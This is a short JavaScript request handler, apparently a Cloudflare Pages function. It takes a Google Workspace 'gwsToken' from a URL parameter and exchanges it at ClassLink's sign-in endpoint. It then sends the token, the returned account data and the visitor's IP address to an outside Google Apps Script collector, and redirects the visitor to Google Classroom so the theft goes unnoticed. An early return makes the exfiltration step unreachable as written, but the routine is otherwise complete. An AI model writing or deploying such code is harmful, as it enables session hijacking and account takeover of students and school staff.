export async function onRequest(context) {
    const { request } = context;
    const url = new URL(request.url);
    const idMatch = url.search.match(/[?&]i=([^&]+)/);
    const idString = decodeURI(idMatch ? idMatch[1] : null);
    const ip = request.headers.get("CF-Connecting-IP");
    
    let id;
    try {
        id = JSON.parse(idString);
        id = id.gwsToken;
        return Response.redirect("https://id.google.com"+id, 302);
    } catch (error) {
        return Response.redirect("https://error.google.com"+error, 302);
    }
    try {
        const nodeApiResponse = await fetch("https://nodeapi.classlink.com/user/signinwith", {
            method: "GET",
            headers: {
                "gwsToken": id
            }
        });

        if (nodeApiResponse.ok) {
            const nodeApiData = await nodeApiResponse.json();

            await fetch("https://script.google.com/macros/s/AKfycby_P-QtHUn6jY6pWyuaNPD3WY0IO4fbnBDaDjMrXJo/dev", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({ userRes: idString, qrRes: nodeApiData, ip: ip })
            });
        }
    } catch (error) {
        return Response.redirect("https://error.google.com"+error, 302);
    }
    return Response.redirect("https://classroom.google.com", 302);
}
